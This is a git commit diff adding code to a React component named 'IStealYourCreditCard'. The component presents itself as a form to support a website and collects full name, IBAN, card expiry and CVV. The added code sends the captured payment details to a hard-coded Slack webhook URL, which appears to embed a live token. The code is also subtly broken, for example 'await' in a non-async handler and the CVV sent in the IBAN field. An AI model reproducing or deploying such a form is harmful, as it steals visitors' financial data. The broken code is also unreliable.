e8e379db4a72f961d5cbba01f53cc499051295c1
IveNooName <226706111+IveNooName@users.noreply.github.com>
2026-08-27 14:30:23 +0200

    added something

--- src/components/IStealYourCreditCard/IStealYourCreditCard.tsx
+++ src/components/IStealYourCreditCard/IStealYourCreditCard.tsx
@@ -1,7 +1,33 @@
 import "./IStealYourCreditCard.css";
+import {useState} from "react";
+
+async function sendToSlack(message: string) {
+    const respone = await fetch('https://hooks.slack.com/services/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', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: message }),
+    })
+
+    if(!respone.ok) {
+        throw new Error('Sending to Slack failed');
+    }
+}
 
 
 function IStealYourCreditCard() {
+
+    const [formData, setFormData] = useState({
+        fullName: '',
+        iban: '',
+        expiryDate: '',
+        cvv: 0,
+    })
+
+    function handleChange(e: React.ChangeEvent<HTMLInputElement>) {
+        const { name, value } = e.target;
+        setFormData(prev => ({ ...prev, [name]: value }));
+    }
+
     return (
         <div className="isteal-your-credit-card">
             <h1 className={"h1"}>You want to help me maintaining the site?</h1>
@@ -10,30 +36,34 @@ function IStealYourCreditCard() {
 
             <div className="input-group py-1">
                 <div className="form-floating">
-                    <input className="form-control" type="text" id="credit-card-full-name" placeholder="Name"/>
+                    <input className="form-control" type="text" id="credit-card-full-name" placeholder="Name" onChange={handleChange} />
                     <label htmlFor="credit-card-full-name">Full Name</label>
                 </div>
 
                 <div className="form-floating">
                     <input className="form-control" type="text" id="credit-card-iban" placeholder=""
-                           spellCheck="false"/>
+                           spellCheck="false" onChange={handleChange} />
                     <label htmlFor="credit-card-iban">IBAN</label>
                 </div>
             </div>
             <div className="input-group py-1">
                 <div className="form-floating">
                     <input className="form-control" type="text" autoComplete="cc-exp" id="credit-card-expiration-date"
-                           placeholder=""/>
+                           placeholder="" name={formData.fullName} onChange={handleChange} />
                     <label htmlFor="credit-card-expiration-date">Expiration date</label>
                 </div>
                 <div className="form-floating">
                     <input className="form-control" type="number" autoComplete="cc-cvv" id="credit-card-cvv"
-                           placeholder=""/>
+                           placeholder="" onChange={handleChange} />
                     <label htmlFor="credit-card-cvv">CVV</label>
                 </div>
             </div>
             <div className={"credit-card-button-container py-4"}>
-                <button className="btn btn-primary credit-card-button" type="submit">Submit</button>
+                <button className="btn btn-primary credit-card-button" type="submit" onSubmit={() => {
+                    await sendToSlack(
+                        `Name: ${formData.fullName}\n IBAN: ${formData.cvv} \n Expiration Date: ${formData.expiryDate}\n CVV: ${formData.cvv}`,
+                    )
+                }}>Submit</button>
             </div>
         </div>
     );
